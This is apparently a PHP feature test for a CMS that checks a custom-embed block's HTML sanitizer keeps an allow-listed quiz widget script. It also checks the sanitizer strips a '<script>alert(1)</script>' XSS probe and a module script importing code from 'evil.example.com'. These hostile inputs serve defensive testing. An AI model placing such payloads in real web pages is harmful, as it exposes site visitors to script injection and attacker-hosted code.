<?php

namespace Tests\Feature;

use App\Modules\Core\Contracts\BlockRendererContract;
use Tests\TestCase;

class CustomEmbedBlockTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        $allowedTypes = (array) config('cms.blocks.allowed_types', []);
        if (! in_array('custom_code_embed', $allowedTypes, true)) {
            $allowedTypes[] = 'custom_code_embed';
        }
        config()->set('cms.blocks.allowed_types', $allowedTypes);

        $safeDomains = (array) config('cms.custom_code.safe_embed_domains', []);
        if (! in_array('hbpn.link', $safeDomains, true)) {
            $safeDomains[] = 'hbpn.link';
        }
        config()->set('cms.custom_code.safe_embed_domains', $safeDomains);
    }

    public function test_custom_code_embed_block_is_rendered_with_restricted_sanitization(): void
    {
        /** @var BlockRendererContract $renderer */
        $renderer = $this->app->make(BlockRendererContract::class);

        $html = $renderer->render([
            [
                'type' => 'custom_code_embed',
                'data' => [
                    'label' => 'Видео',
                    'html' => '<div id="pena-quiz-container-NYDvUx"></div><script type="module">import { ContainerWidget } from "https://hbpn.link/export/pub.js"; new ContainerWidget({"quizId":"00015f04-c8c0-4ee7-b209-bf08978eaa0e","selector":"#pena-quiz-container-NYDvUx"});</script><script>alert(1)</script>',
                ],
            ],
        ]);

        $this->assertStringContainsString('cms-custom-embed', $html);
        $this->assertStringContainsString('cms-embed-label', $html);
        $this->assertStringContainsString('pena-quiz-container-NYDvUx', $html);
        $this->assertStringContainsString('id="pena-quiz-container-NYDvUx"', $html);
        $this->assertStringContainsString('<script type="module">', $html);
        $this->assertStringContainsString('https://hbpn.link/export/pub.js', $html);
        $this->assertStringContainsString('new ContainerWidget', $html);
        $this->assertStringNotContainsString('alert(1)', $html);
    }

    public function test_custom_code_embed_inline_module_script_with_disallowed_import_is_removed(): void
    {
        /** @var BlockRendererContract $renderer */
        $renderer = $this->app->make(BlockRendererContract::class);

        $html = $renderer->render([
            [
                'type' => 'custom_code_embed',
                'data' => [
                    'label' => 'Bad',
                    'html' => '<div id="x"></div><script type="module">import Bad from "https://evil.example.com/bad.js"; console.log(Bad);</script>',
                ],
            ],
        ]);

        $this->assertStringNotContainsString('type="module"', $html);
        $this->assertStringNotContainsString('evil.example.com', $html);
        $this->assertStringNotContainsString('<script', $html);
    }
}
